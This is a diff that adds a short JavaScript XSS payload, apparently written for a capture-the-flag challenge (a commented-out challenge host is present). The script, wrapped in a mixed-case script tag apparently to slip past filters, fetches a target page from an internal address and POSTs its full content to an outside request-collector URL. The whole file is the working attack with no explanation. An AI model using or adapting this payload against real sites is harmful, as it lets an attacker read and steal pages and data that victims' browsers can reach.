@@ -1,0 +1,30 @@
+<ScRiPt>
+function sendToServer(token){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", POST_URL, true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("HTML=" + token);
+}
+
+
+function getContentPage() {
+    var xhr = new XMLHttpRequest();
+    // true on the end of here makes the call asynchronous
+    xhr.open("GET", TARGET_URL, true);
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            input = xhr.response;
+            sendToServer(input);
+        }
+    };
+    // Make the request
+    xhr.send(null);
+}
+
+
+
+//var TARGET_URL="http://internalsupport22.chall.malicecyber.com/";
+var TARGET_URL="http://127.0.0.1:5000";
+var POST_URL="https://ce62502b08a70451cbea477dbad80a17.m.pipedream.net";
+getContentPage();
+</ScRiPt>
